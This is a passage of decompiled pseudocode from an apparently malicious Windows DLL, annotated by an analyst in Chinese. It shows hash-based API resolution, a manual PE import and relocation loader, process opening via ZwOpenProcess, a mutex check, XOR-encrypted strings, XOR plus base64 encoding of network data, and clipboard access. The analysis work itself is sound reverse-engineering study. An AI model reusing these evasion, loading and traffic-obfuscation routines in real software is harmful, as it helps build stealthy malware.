          for ( j = (char *)(a1 - 4 + 4 * (a3 >> 2)); v4; --v4 )
          {
            v7 = *(_DWORD *)v5;
            v5 -= 4;
            *(_DWORD *)j = v7;
            j -= 4;
          }
          v8 = a3 & 3;
          if ( a3 & 3 )
          {
            v9 = v5 - j;
            do
            {
              *j = j[v9];
              --j;
              --v8;
            }
            while ( v8 );
          }
        }
      }
    }
  }
  return a1;
}

//----- (10002A8F) --------------------------------------------------------
BOOL __cdecl bj_sub_10002A8F_free(LPVOID lpMem)
{
  BOOL result; // eax
  HANDLE v2; // eax

  result = 0;
  if ( lpMem )
  {
    v2 = GetProcessHeap();
    result = HeapFree(v2, 8u, lpMem);
  }
  return result;
}

//----- (10002AAD) --------------------------------------------------------
LPVOID __cdecl bj_realloc_sub_10002AAD(LPVOID lpMem, SIZE_T dwBytes)
{
  LPVOID result; // eax
  HANDLE v3; // eax

  if ( !lpMem )
    return bj_sub_1000295A_alloc(dwBytes);
  if ( dwBytes )
  {
    v3 = GetProcessHeap();
    result = HeapReAlloc(v3, 8u, lpMem, dwBytes);
  }
  else
  {
    bj_sub_10002A8F_free(lpMem);
    result = 0;
  }
  return result;
}

//----- (10002AE7) --------------------------------------------------------
LPVOID __cdecl bj_saveinnewheap_sub_10002AE7(int a1, SIZE_T dwBytes)
{
  LPVOID v2; // esi

  v2 = 0;
  if ( a1 && dwBytes )
  {
    v2 = bj_sub_1000295A_alloc(dwBytes);
    bj_strcpy_sub_100029F9((unsigned int)v2, (_DWORD *)a1, dwBytes);
  }
  return v2;
}

//----- (10002B15) --------------------------------------------------------
// arg1: ImageBase
// 返回1表示成功
signed int __cdecl bj_sub_10002B15(int a1)
{
  signed int v1; // edi
  int *hkernel32; // eax
  int v3; // esi
  unsigned int bj_GetProcAddress; // eax
  unsigned int v5; // ebx
  unsigned int bj_LoadLibraryA; // eax
  int v7; // eax
  int v8; // ecx
  unsigned int v9; // edx
  int v10; // ecx
  unsigned __int8 *v11; // esi
  _DWORD *v12; // ecx
  _DWORD *pIAT; // esi
  int *pINT; // eax
  int v15; // eax
  unsigned int v17; // [esp+8h] [ebp-1Ch]
  int (__fastcall *v18)(int, unsigned int, int); // [esp+Ch] [ebp-18h]
  unsigned int v19; // [esp+10h] [ebp-14h]
  int v20; // [esp+14h] [ebp-10h]
  int (__stdcall *v21)(int *, int); // [esp+18h] [ebp-Ch]
  int *v22; // [esp+1Ch] [ebp-8h]
  _DWORD *v23; // [esp+20h] [ebp-4h]

  v1 = 0;
  hkernel32 = bj_sub_10002609_finddllbasebyunicodenamehash(0x98853A78, 1, 0);
  v3 = (int)hkernel32;
  if ( hkernel32 )
  {
    bj_GetProcAddress = bj_sub_10002661_getprocaddrbyasciinamehash((int)hkernel32, 0x3B66D24C, 1, 0);
    v5 = bj_GetProcAddress;
    v21 = (int (__stdcall *)(int *, int))bj_GetProcAddress;
    bj_LoadLibraryA = bj_sub_10002661_getprocaddrbyasciinamehash(v3, 0x79F5D836, 1, 0);
    v18 = (int (__fastcall *)(int, unsigned int, int))bj_LoadLibraryA;
    if ( v5 )
    {
      if ( bj_LoadLibraryA )
      {
        if ( a1 )
        {
          if ( *(_WORD *)a1 == 0x5A4D )
          {
            v7 = *(_DWORD *)(a1 + 0x3C);
            if ( *(_DWORD *)(v7 + a1) == 0x4550 )
            {
              v8 = a1 + *(_DWORD *)(v7 + a1 + 0x80);// 这个是导入表的VA
              v9 = *(_DWORD *)(v7 + a1 + 0x84) % 0x14u;
              v23 = (_DWORD *)(a1 + *(_DWORD *)(v7 + a1 + 0x80));
              v17 = *(_DWORD *)(v7 + a1 + 0x84) / 0x14u;// 似乎是IMAGE_IMPORT_DESCRIPTOR的个数,但是能这样算吗?
                                                // 为什么前面还求了个余数呢?sizeof(IMAGE_IMPORT_DESCRIPTOR)不是刚好0x14吗,
                                                // 那么按倍数来讲应该不会有什么余数啊
              v19 = 0;
              if ( v17 )
              {
                do                              // 这里应该是填自己的IAT了..
                {
                  v10 = *(_DWORD *)(v8 + 0xC);  // DllNameRVA
                  if ( !v10 )
                    break;
                  v11 = (unsigned __int8 *)(v10 + a1);// lpszDllName
                  v22 = (int *)v18(v10, v9, v10 + a1);// 为什么LoadLibraryA居然会有3个参数???  莫非这还能是个逗号表达式不成???
                                                // 我靠, 居然是__fastcall, 牛逼, 真TM牛逼, 把前两个参数在ecx,edx里面, 就只有第三个参数压栈了, 这样堆栈就平衡了... 我靠,真尼玛的牛逼!!
                  bj_sub_1000249C(v11, v22, 0);
                  v12 = v23;
                  pIAT = (_DWORD *)(a1 + v23[4]);
                  pINT = (int *)(a1 + *v23);
                  v20 = a1 + *v23;
                  if ( *pIAT )
                  {
                    do
                    {
                      v15 = *pINT;
                      if ( !v15 )
                        break;
                      if ( v15 < 0 )
                        v15 = (unsigned __int16)v15;
                      else
                        v15 += a1 + 2;
                      *pIAT = v21(v22, v15);
                      ++pIAT;
                      pINT = (int *)(v20 + 4);
                      v20 += 4;
                    }
                    while ( *pIAT );            // 这里就是根据INT函数名,然后getprocaddress填入IAT对应位置
                    v12 = v23;
                  }
                  v8 = (int)(v12 + 5);
                  v23 = (_DWORD *)v8;
                  ++v19;
                }
                while ( v19 < v17 );
              }
              v1 = 1;
            }
          }
        }
      }
    }
  }
  return v1;
}

//----- (10002C39) --------------------------------------------------------
signed int __cdecl bj_sub_10002C39_relocatingOperation(int a1, int a2)
{
  signed int result; // eax
  int v3; // esi
  int v4; // ebx
  _DWORD *v5; // edx
  _DWORD *v6; // edi
  int v7; // ebx
  _DWORD *v8; // eax
  _WORD *v9; // edx
  unsigned int v10; // ecx
  _DWORD *v11; // [esp+4h] [ebp-Ch]
  unsigned int v12; // [esp+8h] [ebp-8h]
  __int16 v13; // [esp+1Ah] [ebp+Ah]

  result = 0;
  v3 = a1;
  if ( a1 )
  {
    v4 = a2;
    if ( a2 )
    {
      if ( *(_WORD *)a1 == 0x5A4D )
      {
        v5 = (_DWORD *)(a1 + *(_DWORD *)(a1 + 0x3C));
        v11 = v5;
        if ( *v5 == 0x4550 )
        {
          if ( a2 != v5[13] )
          {
            v6 = (_DWORD *)(a1 + v5[40]);
            v12 = (unsigned int)v6 + v5[41];
            if ( (unsigned int)v6 < v12 )
            {
              v7 = a2 - v5[13];
              do
              {
                v8 = v6 + 1;
                v9 = v6 + 2;
                v10 = (unsigned int)(v6[1] - 8) >> 1;
                if ( v10 )
                {
                  do
                  {
                    v13 = *v9 >> 12;
                    if ( v13 == 3 || v13 == 10 )
                      *(_DWORD *)(*v6 + (*v9 & 0xFFF) + v3) += v7;
                    ++v9;
                    --v10;
                  }
                  while ( v10 );
                  v8 = v6 + 1;
                }
                v6 = (_DWORD *)((char *)v6 + *v8);
              }
              while ( (unsigned int)v6 < v12 );
              v5 = v11;
              v4 = a2;
            }
            v5[13] = v4;
          }
          result = 1;
        }
      }
    }
  }
  return result;
}

//----- (10002CF7) --------------------------------------------------------
// *(DWORD*)a1==0
int __cdecl bj_sub_10002CF7_getpreselectedprocesshandle(int a1)
{
  int v1; // esi
  int targetPID; // eax

  v1 = 0;
  targetPID = bj_sub_1000250C((_DWORD *)a1);    // __Out__ a1 ProcessImageUnicodeNameHash
  if ( targetPID )
    v1 = bj_sub_10002DB7_gettargetprocesshandle_by_ZwOpenProcess(targetPID);
  return v1;
}

//----- (10002D18) --------------------------------------------------------
_BYTE *__cdecl bj_sub_10002D18_skipspace(_BYTE *a1)
{
  _BYTE *result; // eax

  for ( result = a1; *result == 0x20; ++result )
    ;
  return result;
}

//----- (10002D28) --------------------------------------------------------
unsigned int __cdecl bj_sub_10002D28_strlen(int a1)
{
  return bj_sub_100023C7_strlen((const char *)a1);
}

//----- (10002D31) --------------------------------------------------------
_BYTE *__cdecl bj_xordecrypt_sub_10002D31(_BYTE *a1, unsigned int a2, int a3, unsigned int a4)
{
  _BYTE *v4; // esi
  _BYTE *v5; // ebx
  unsigned int v6; // esi

  v4 = a1;
  if ( a1 )
  {
    if ( a3 )
    {
      v5 = a1;
      if ( a2 )
      {
        v6 = 0;
        do
          *v5++ ^= *(_BYTE *)(v6++ % a4 + a3);
        while ( v6 < a2 );
        v4 = a1;
      }
    }
  }
  return v4;
}

//----- (10002D6C) --------------------------------------------------------
BOOL __cdecl bj_sub_10002D6C_ZwClose(int a1)
{
  BOOL v1; // esi
  int *v2; // eax
  int (__stdcall *bj_ZwClose)(int); // eax

  v1 = 0;
  if ( a1 )
  {
    if ( a1 != -1 )
    {
      v2 = bj_sub_10002609_finddllbasebyunicodenamehash(0xA4137E37, 1, 0);
      if ( v2 )
      {
        bj_ZwClose = (int (__stdcall *)(int))bj_sub_10002661_getprocaddrbyasciinamehash((int)v2, 0x99885504, 1, 0);
        if ( bj_ZwClose )
          v1 = bj_ZwClose(a1) == 0;
      }
    }
  }
  return v1;
}

//----- (10002DB7) --------------------------------------------------------
int __cdecl bj_sub_10002DB7_gettargetprocesshandle_by_ZwOpenProcess(int nPID)
{
  int v1; // esi
  int *hntdll; // eax
  int (__stdcall *v3)(int *, signed int, int *, int *); // ecx
  int v4; // eax
  int v6; // [esp+4h] [ebp-24h]
  int v7; // [esp+8h] [ebp-20h]
  int v8; // [esp+Ch] [ebp-1Ch]
  int v9; // [esp+10h] [ebp-18h]
  int v10; // [esp+14h] [ebp-14h]
  int v11; // [esp+18h] [ebp-10h]
  int v12; // [esp+1Ch] [ebp-Ch]
  int v13; // [esp+20h] [ebp-8h]
  int processhandle; // [esp+24h] [ebp-4h]

  v1 = 0;
  processhandle = 0;
  hntdll = bj_sub_10002609_finddllbasebyunicodenamehash(0xA4137E37, 1, 0);
  if ( hntdll )
  {
    v3 = (int (__stdcall *)(int *, signed int, int *, int *))bj_sub_10002661_getprocaddrbyasciinamehash(
                                                               (int)hntdll,
                                                               0x46264019,// ZwOpenProcess
                                                               1,
                                                               0);
    if ( v3 )
    {
      v6 = 0x18;                                // OBJECT_ATTRIBUTES
      v13 = 0;
      v7 = 0;
      v8 = 0;
      v9 = 0;
      v10 = 0;
      v11 = 0;
      v12 = nPID;
      v4 = v3(&processhandle, 0x43A, &v6, &v12);
      v1 = processhandle;
      if ( v4 )
        v1 = 0;
    }
    else
    {
      v1 = processhandle;
    }
  }
  return v1;
}

//----- (10002E33) --------------------------------------------------------
DWORD __stdcall bj_sub_10002E33(LPVOID lpThreadParameter)
{
  int *v1; // esi
  int *v3; // eax
  HANDLE hObject; // [esp+4h] [ebp-4h]

  v1 = 0;
  hObject = 0;
  if ( !bj_sub_10002E90(&hObject) )             // 这个hobj就是返回的mutex句柄
  {
    v3 = (int *)bj_sub_10003F04_alloc(0x23u);   // 分配0x23个字节
    if ( v3 )
      v1 = bj_sub_10004758(v3);                 // 一些数据构造
    bj_sub_10005D0A((LPCSTR *)v1);
  }
  return 1;
}

//----- (10002E90) --------------------------------------------------------
char __cdecl bj_sub_10002E90(_DWORD *a1)
{
  CHAR *v1; // esi
  HANDLE v2; // edi
  DWORD v3; // ebx

  v1 = bj_sub_100030D1_strdecrypt((int)&bj_unk_1000719C, 0x15);// 将arg1地址处的0x15+1个字节的值解密并返回
  v2 = CreateMutexA(0, 1, v1);                  // 作为Mutex的名称  "Q1jIibEAnOpLPFL7e9gLm"
  v3 = GetLastError();
  bj_sub_10003F45_free(v1);
  if ( !v2 || v3 == 0xB7 )                      // B7是代表mutex已经存在
    return 1;                                   // 如果创建失败，那么返回1；
                                                // 如果创建成功，但是mutex已经存在，那么也返回1。
  *a1 = v2;
  return 0;
}

//----- (10002EDE) --------------------------------------------------------
BYTE *__cdecl bj_sub_10002EDE_base64crypt(LPCSTR pszString, DWORD cchString, DWORD *pcbBinary)
{
  BYTE *v3; // esi

  v3 = 0;
  CryptStringToBinaryA(pszString, cchString, 1u, 0, pcbBinary, 0, 0);// 1：CRYPT_STRING_BASE64
  if ( *pcbBinary )                             // 第一次调用时*pcbBinary==0,，第二次才是真正调用
  {
    v3 = (BYTE *)bj_sub_10003F3C_alloc(*pcbBinary);// 得到大小，分配空间
    CryptStringToBinaryA(pszString, cchString, 1u, v3, pcbBinary, 0, 0);// 真正进行转换，base64加密字符串，得到的字节数组在v3,返回v3。
  }
  return v3;
}

//----- (10002F22) --------------------------------------------------------
CHAR *__cdecl bj_sub_10002F22_base64crypt(BYTE *pbBinary, DWORD cbBinary)
{
  CHAR *v2; // esi
  DWORD pcchString; // [esp+8h] [ebp-4h]

  pcchString = 0;
  CryptBinaryToStringA(pbBinary, cbBinary, 0x40000001u, 0, &pcchString);// CRYPT_STRING_BASE64|CRYPT_STRING_NOCRLF
  v2 = (CHAR *)bj_sub_10003F3C_alloc(pcchString);
  CryptBinaryToStringA(pbBinary, cbBinary, 0x40000001u, v2, &pcchString);
  return v2;
}

//----- (10002F69) --------------------------------------------------------
void *__cdecl bj_sub_10002F69_A2W(LPCSTR lpString)
{
  int v1; // esi
  void *v2; // edi

  v1 = lstrlenA(lpString) + 1;
  v2 = bj_sub_10003F3C_alloc(2 * v1 | -((unsigned __int64)(unsigned int)v1 >> 31 != 0));
  if ( !MultiByteToWideChar(0, 0, lpString, -1, (LPWSTR)v2, v1) )
  {
    bj_sub_10003F45_free(v2);
    v2 = 0;
  }
  return v2;
}

//----- (10002FB7) --------------------------------------------------------
CHAR *__cdecl bj_sub_10002FB7_unicodetomultibyte(LPCWSTR lpWideCharStr)
{
  int v1; // esi
  CHAR *v2; // edi

  v1 = WideCharToMultiByte(0xFDE9u, 0, lpWideCharStr, -1, 0, 0, 0, 0);
  v2 = (CHAR *)bj_sub_10003F3C_alloc(v1);
  WideCharToMultiByte(0xFDE9u, 0, lpWideCharStr, -1, v2, v1, 0, 0);
  return v2;
}

//----- (10002FFB) --------------------------------------------------------
void *__cdecl bj_sub_10002FFB_receivingdatadecrypt(LPCSTR pszString, DWORD cchString, int a3)
{
  void *v3; // edi
  BYTE *v4; // ebx
  DWORD v5; // esi
  _BYTE *v6; // edx
  DWORD v7; // ecx
  int v8; // esi
  int v10; // [esp+8h] [ebp-14h]
  LPVOID lpMem; // [esp+Ch] [ebp-10h]
  int v12; // [esp+10h] [ebp-Ch]
  DWORD pcbBinary; // [esp+14h] [ebp-8h]
  int v14; // [esp+18h] [ebp-4h]

  v3 = 0;
  pcbBinary = 0;
  v4 = bj_sub_10002EDE_base64crypt(pszString, cchString, &pcbBinary);
  if ( v4 )
  {
    v14 = 0;
    bj_sub_10003271_cpy((int)&v14, v4, 4);
    v5 = pcbBinary - 4;
    v10 = v14 ^ 0xAA7D756;
    v6 = bj_sub_10003F3C_alloc(pcbBinary - 4);
    v7 = 0;
    lpMem = v6;
    if ( v5 )
    {
      do
      {
        v6[v7] = v4[v7 + 4] ^ *((_BYTE *)&v10 + (v7 & 3));
        ++v7;
      }
      while ( v7 < v5 );
    }                                           // 接收到的数据,先进行一次base64,之后前4个字节是密钥, 异或一个常量后, 用于接收到的数据的解密.
    v12 = 0;
    bj_sub_10003271_cpy((int)&v12, v6, 2);
    v8 = v5 - 2;                                // 0~3是密钥, 第4~5个字节也是特别的
    *(_DWORD *)a3 = v8;                         // a3是真正的数据长度
    v3 = bj_sub_10003F3C_alloc(v8 + 1);
    bj_sub_10003271_cpy((int)v3, (_BYTE *)lpMem + 2, v8);// 此时v3存着真正的数据
    if ( !bj_IsDataCorrect_sub_100031FE(v12, (BYTE *)v3, v8) )
    {
      bj_sub_10003F45_free(v3);
      v3 = 0;                                   // 成功,返回v3,失败返回0
    }
    bj_sub_10003F45_free(lpMem);
    bj_sub_10003F45_free(v4);
  }
  return v3;
}

//----- (100030D1) --------------------------------------------------------
_BYTE *__cdecl bj_sub_100030D1_strdecrypt(int a1, int a2)
{
  int v2; // ebx
  _BYTE *v3; // esi
  int v4; // eax
  int i; // [esp+18h] [ebp+Ch]

  v2 = a2;
  v3 = bj_sub_10003F3C_alloc(a2 + 1);           // 分配a2+1字节大小的堆空间
  v4 = 0;
  for ( i = 0; v4 < v2; i = v4 )
  {
    v3[v4] = *(_BYTE *)(a1 + v4) ^ bj_byte_100071B4[v4 % 0xEu];
    v4 = i + 1;
  }
  return v3;
}

//----- (10003123) --------------------------------------------------------
CHAR *__cdecl bj_sub_10003123_xorencrpyt(int a1, int a2, LPVOID lpMem)
{
  DWORD v3; // eax
  unsigned int v4; // ebx
  void *v5; // edi
  unsigned int v6; // ecx
  DWORD v7; // esi
  BYTE *v8; // edi
  int v9; // ST18_4
  void *v10; // ebx
  CHAR *v11; // esi
  DWORD v13; // [esp+Ch] [ebp-8h]
  DWORD v14; // [esp+10h] [ebp-4h]

  v3 = bj_sub_10003DE0_randnum(0x1010101, 0xFFFFFFFF);
  v4 = a2;
  v13 = v3;
  v14 = v3 ^ 0xAA7D756;
  if ( (_BYTE)lpMem )
  {
    a2 = bj_VerifyData_sub_10003217((BYTE *)a1, a2);
    v5 = bj_sub_10003F3C_alloc(v4 + 2);
    lpMem = v5;
    bj_sub_10003271_cpy((int)v5, &a2, 2);
    bj_sub_10003271_cpy((int)v5 + 2, (_BYTE *)a1, v4);
    v4 += 2;
  }
  else
  {
    v5 = bj_sub_10003F3C_alloc(a2);
    lpMem = v5;
    bj_sub_10003271_cpy((int)v5, (_BYTE *)a1, v4);
  }
  v6 = 0;
  if ( v4 )
  {
    do
    {
      *((_BYTE *)v5 + v6) ^= *((_BYTE *)&v14 + (v6 & 3));
      ++v6;
    }
    while ( v6 < v4 );                          // 又是这种异或加密方式
  }
  v7 = v4 + 4;
  v8 = (BYTE *)bj_sub_10003F3C_alloc(v4 + 4);
  bj_sub_10003271_cpy((int)v8, &v13, 4);
  v9 = v4;
  v10 = lpMem;
  bj_sub_10003271_cpy((int)(v8 + 4), lpMem, v9);// 前4个字节是随机出来的密钥，后面紧跟着加密的内容
  v11 = bj_sub_10002F22_base64crypt(v8, v7);
  bj_sub_10003F45_free(v8);
  bj_sub_10003F45_free(v10);
  return v11;
}

//----- (100031FE) --------------------------------------------------------
bool __cdecl bj_IsDataCorrect_sub_100031FE(__int16 a1, BYTE *a2, unsigned int a3)
{
  return a1 == bj_VerifyData_sub_10003217(a2, a3);
}

//----- (10003217) --------------------------------------------------------
unsigned __int16 __cdecl bj_VerifyData_sub_10003217(BYTE *a1, unsigned int a2)
{
  unsigned int v2; // edx
  unsigned __int16 v3; // cx
  BYTE v4; // bl
  signed int v5; // esi
  __int16 v7; // [esp+0h] [ebp-4h]

  v2 = 0;
  v3 = 0;
  LOBYTE(v7) = 0;
  if ( a2 )
  {
    do
    {
      v4 = a1[v2];
      v5 = 8;
      do
      {
        if ( ((unsigned __int8)v7 ^ v4) & 1 )
        {
          v7 = (unsigned __int16)(v3 ^ 0x2042) >> 1;
          v3 = (unsigned __int16)(v3 ^ 0x2042) >> 1;
        }
        else
        {
          v3 >>= 1;
          LOBYTE(v7) = v3;
        }
        v4 >>= 1;
        --v5;
      }
      while ( v5 );
      ++v2;
    }
    while ( v2 < a2 );
  }
  return v3;
}

//----- (10003271) --------------------------------------------------------
int __cdecl bj_sub_10003271_cpy(int a1, _BYTE *a2, int a3)
{
  int result; // eax
  int v4; // esi
  _BYTE *v5; // edx

  result = a1;
  v4 = a3;
  if ( a3 )
  {
    v5 = a2;
    do
    {
      v5[a1 - (_DWORD)a2] = *v5;                // 相当于*(byte*)a1 = *v5;
      ++v5;
      --v4;
    }
    while ( v4 );
  }
  return result;
}

//----- (10003296) --------------------------------------------------------
char *__cdecl bj_sub_10003296_memset(char *a1, unsigned __int8 a2, unsigned int a3)
{
  if ( a3 )
  {
    memset32(a1, 0x1010101 * a2, a3 >> 2);
    memset(&a1[4 * (a3 >> 2)], a2, a3 & 3);
  }
  return a1;
}

//----- (100032C4) --------------------------------------------------------
_BYTE *__cdecl bj_sub_100032C4_strfind(_BYTE *a1, char a2)
{
  _BYTE *result; // eax

  for ( result = a1; *result; ++result )
  {
    if ( *result == a2 )
      return result;
  }
  if ( 0 != a2 )
    result = 0;
  return result;
}

//----- (100032E2) --------------------------------------------------------
// 这个函数真的牛逼...
// 太巧妙了...
// 虽然功能很一般,就是在a1中寻找a2出现的位置
char *__cdecl bj_sub_100032E2_strfind(char *a1, _BYTE *a2)
{
  char *v2; // edx
  char v4; // al
  int v5; // edi
  _BYTE *v6; // esi

  v2 = a1;
  if ( !*a2 )
    return a1;
  v4 = *a1;
  if ( !*a1 )
    return 0;
  v5 = a1 - a2;
  while ( 1 )
  {
    v6 = a2;
    if ( v4 )
      break;
LABEL_9:
    if ( !*v6 )
      return v2;
    ++v2;
    ++v5;
    v4 = *v2;
    if ( !*v2 )
      return 0;
  }
  while ( *v6 )
  {
    if ( v6[v5] == *v6 )                        // 考虑极端情况,如果一直相等,那么最终会返回v2,也就是没有被任何修改过的a1
    {
      if ( (++v6)[v5] )
        continue;
    }
    goto LABEL_9;
  }                                             // 不是KMP
  return v2;
}

//----- (10003336) --------------------------------------------------------
// 在W版字符串中寻找第一个L'/'
_WORD *__cdecl bj_sub_10003336(_WORD *a1, __int16 a2)
{
  _WORD *result; // eax

  for ( result = a1; *result; ++result )
  {
    if ( *result == a2 )
      return result;
  }
  if ( *result != a2 )
    result = 0;
  return result;
}

//----- (1000335B) --------------------------------------------------------
char __cdecl bj_sub_1000335B_strcmp(char *a1, char *a2)
{
  char *v2; // edx
  int v3; // edi
  int v4; // ecx
  int v5; // esi
  char result; // al

  v2 = a2;
  v3 = *(unsigned __int16 *)a2;
  v4 = *(unsigned __int16 *)a1 - v3;
  if ( *(unsigned __int16 *)a1 == v3 )
  {
    v5 = a1 - a2;
    do
    {
      if ( !(_WORD)v3 )
        break;
      v2 += 2;
      v3 = *(unsigned __int16 *)v2;
      v4 = *(unsigned __int16 *)&v2[v5] - v3;
    }
    while ( *(unsigned __int16 *)&v2[v5] == v3 );
  }
  if ( v4 >= 0 )
    result = v4 > 0;
  else
    result = -1;
  return result;
}

//----- (10003399) --------------------------------------------------------
BOOL __stdcall CloseClipboard_10003399()
{
  int v0; // ebx
  CHAR *v1; // edi
  HMODULE v2; // esi
  const CHAR *v3; // eax
  int (*v4)(void); // eax
  CHAR *lpMem; // [esp+Ch] [ebp-4h]

  v0 = 0;
  v1 = bj_sub_100030D1_strdecrypt((int)&user32dll_100071D0, 10);
  v2 = GetModuleHandleA(v1);
  if ( v2 || (v2 = LoadLibraryA(v1)) != 0 )
  {
    v3 = bj_sub_100030D1_strdecrypt((int)&unk_10007280, 14);
    lpMem = (CHAR *)v3;
    v4 = (int (*)(void))GetProcAddress(v2, v3);
    if ( v4 )
      v0 = v4();
    bj_sub_10003F45_free(lpMem);
  }
  bj_sub_10003F45_free(v1);
  return v0;
}

//----- (10003406) --------------------------------------------------------
int __cdecl CreateProcessW_sub_10003406(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10)
{
  int v10; // ebx
  CHAR *v11; // edi
  HMODULE v12; // esi
  const CHAR *v13; // eax
  FARPROC v14; // eax
  CHAR *lpMem; // [esp+Ch] [ebp-4h]

  v10 = 0;
  v11 = bj_sub_100030D1_strdecrypt((int)&bj_Kerner32_dll_100071C4, 12);// "Kernel32.dll"
  v12 = GetModuleHandleA(v11);
  if ( v12 || (v12 = LoadLibraryA(v11)) != 0 )
  {
    v13 = bj_sub_100030D1_strdecrypt((int)&CreateProcessW_unk_1000721C, 14);// "CreateProcessW"
    lpMem = (CHAR *)v13;
    v14 = GetProcAddress(v12, v13);
    if ( v14 )
      v10 = ((int (__stdcall *)(int, int, int, int, int, int, int, int, int, int))v14)(
              a1,
              a2,
              a3,
              a4,
              a5,
              a6,
              a7,
              a8,
              a9,
              a10);
    bj_sub_10003F45_free(lpMem);
  }
  bj_sub_10003F45_free(v11);
  return v10;
}

//----- (10003491) --------------------------------------------------------
HRESULT __stdcall CreateStreamOnHGlobal_10003491(HGLOBAL hGlobal, BOOL fDeleteOnRelease, LPSTREAM *ppstm)
{
  HRESULT v3; // ebx
  CHAR *v4; // edi
  HMODULE v5; // esi
  const CHAR *v6; // eax
  FARPROC v7; // eax
  CHAR *lpMem; // [esp+Ch] [ebp-4h]

  v3 = 0;
  v4 = bj_sub_100030D1_strdecrypt((int)&ole32dll_100071E8, 9);
  v5 = GetModuleHandleA(v4);
  if ( v5 || (v5 = LoadLibraryA(v4)) != 0 )
  {
    v6 = bj_sub_100030D1_strdecrypt((int)CreateStreamOnHGlobal_10007290, 21);
    lpMem = (CHAR *)v6;
    v7 = GetProcAddress(v5, v6);
    if ( v7 )
      v3 = ((int (__stdcall *)(HGLOBAL, BOOL, LPSTREAM *))v7)(hGlobal, fDeleteOnRelease, ppstm);
    bj_sub_10003F45_free(lpMem);
  }
  bj_sub_10003F45_free(v4);
  return v3;
}

//----- (10003507) --------------------------------------------------------
int __cdecl ExpandEnvironmentStringsW_sub_10003507(int a1, int a2, int a3)
{
  int v3; // ebx
  CHAR *v4; // edi
  HMODULE v5; // esi
  const CHAR *v6; // eax
  FARPROC v7; // eax

  v3 = 0;
  v4 = bj_sub_100030D1_strdecrypt((int)&bj_Kerner32_dll_100071C4, 12);// "Kernel32.dll"
  v5 = GetModuleHandleA(v4);
  if ( v5 || (v5 = LoadLibraryA(v4)) != 0 )
  {
    v6 = bj_sub_100030D1_strdecrypt((int)&bj_unk_10007200, 25);// "ExpandEnvironmentStringsW"
    v7 = GetProcAddress(v5, v6);
    if ( v7 )
      v3 = ((int (__stdcall *)(int, int, int))v7)(a1, a2, a3);
  }
  bj_sub_10003F45_free(v4);
  return v3;
}

//----- (1000356E) --------------------------------------------------------
int __cdecl GetClipboardData_1000356E(int a1)
{
  int v1; // ebx
  CHAR *v2; // edi
  HMODULE v3; // esi
  const CHAR *v4; // eax
  FARPROC v5; // eax
  CHAR *lpMem; // [esp+Ch] [ebp-4h]

  v1 = 0;
  v2 = bj_sub_100030D1_strdecrypt((int)&user32dll_100071D0, 10);
  v3 = GetModuleHandleA(v2);
  if ( v3 || (v3 = LoadLibraryA(v2)) != 0 )
  {
    v4 = bj_sub_100030D1_strdecrypt((int)GetClipboardData_10007270, 16);
    lpMem = (CHAR *)v4;
    v5 = GetProcAddress(v3, v4);
    if ( v5 )
      v1 = ((int (__stdcall *)(int))v5)(a1);
    bj_sub_10003F45_free(lpMem);
  }
  bj_sub_10003F45_free(v2);
  return v1;
}

//----- (100035DE) --------------------------------------------------------
int __cdecl IStream_Read_100035DE(int a1, int a2, int a3)
{
  int v3; // ebx
  CHAR *v4; // edi
  HMODULE v5; // esi
  const CHAR *v6; // eax
  FARPROC v7; // eax
  CHAR *lpMem; // [esp+Ch] [ebp-4h]

  v3 = 0;
  v4 = bj_sub_100030D1_strdecrypt((int)&Shlwapidll_100071DC, 11);
  v5 = GetModuleHandleA(v4);
  if ( v5 || (v5 = LoadLibraryA(v4)) != 0 )
  {
    v6 = bj_sub_100030D1_strdecrypt((int)IStream_Read_10007238, 12);
    lpMem = (CHAR *)v6;
    v7 = GetProcAddress(v5, v6);
    if ( v7 )
      v3 = ((int (__stdcall *)(int, int, int))v7)(a1, a2, a3);
    bj_sub_10003F45_free(lpMem);
  }
  bj_sub_10003F45_free(v4);
  return v3;
}

//----- (10003654) --------------------------------------------------------
HRESULT __stdcall IStream_Reset_10003654(IStream *pstm)
{
  HRESULT v1; // ebx
  CHAR *v2; // edi
  HMODULE v3; // esi
  const CHAR *v4; // eax
  FARPROC v5; // eax
  CHAR *lpMem; // [esp+Ch] [ebp-4h]

  v1 = 0;
  v2 = bj_sub_100030D1_strdecrypt((int)&Shlwapidll_100071DC, 11);
  v3 = GetModuleHandleA(v2);
  if ( v3 || (v3 = LoadLibraryA(v2)) != 0 )
  {
    v4 = bj_sub_100030D1_strdecrypt((int)IStream_Reset_10007244, 13);
    lpMem = (CHAR *)v4;
    v5 = GetProcAddress(v3, v4);
    if ( v5 )
      v1 = ((int (__stdcall *)(IStream *))v5)(pstm);
    bj_sub_10003F45_free(lpMem);
  }
  bj_sub_10003F45_free(v2);
  return v1;
}

//----- (100036C4) --------------------------------------------------------
int __cdecl IStream_Size_100036C4(int a1, int a2)
{
  int v2; // ebx
  CHAR *v3; // edi
  HMODULE v4; // esi
  const CHAR *v5; // eax
  FARPROC v6; // eax
  CHAR *lpMem; // [esp+Ch] [ebp-4h]

  v2 = 0;
  v3 = bj_sub_100030D1_strdecrypt((int)&Shlwapidll_100071DC, 11);
  v4 = GetModuleHandleA(v3);
  if ( v4 || (v4 = LoadLibraryA(v3)) != 0 )
  {
    v5 = bj_sub_100030D1_strdecrypt((int)IStream_Size_10007254, 12);
    lpMem = (CHAR *)v5;
    v6 = GetProcAddress(v4, v5);
    if ( v6 )
      v2 = ((int (__stdcall *)(int, int))v6)(a1, a2);
    bj_sub_10003F45_free(lpMem);
  }
  bj_sub_10003F45_free(v3);
  return v2;
}

//----- (10003737) --------------------------------------------------------
int __cdecl ObtainUserAgentString_sub_10003737(int a1, int a2, int a3)
{
  int v3; // ebx
  CHAR *v4; // edi
  HMODULE v5; // esi
  const CHAR *v6; // eax
  FARPROC v7; // eax
  CHAR *lpMem; // [esp+Ch] [ebp-4h]

  v3 = 0;
  v4 = bj_sub_100030D1_strdecrypt((int)&UrlmonDOTdll_100071F4, 0xA);// 将unk_100071f4处的0xa+1个字节解密，返回
  v5 = GetModuleHandleA(v4);
  if ( v5 || (v5 = LoadLibraryA(v4)) != 0 )     // 得到DLL库句柄
  {
    v6 = bj_sub_100030D1_strdecrypt((int)&ObtainUserAgentString_100072A8, 0x15);// 同样,这个应该是个函数名
    lpMem = (CHAR *)v6;
    v7 = GetProcAddress(v5, v6);
    if ( v7 )
      v3 = ((int (__stdcall *)(int, int, int))v7)(a1, a2, a3);
    bj_sub_10003F45_free(lpMem);                // 下面这两个释放空间
  }
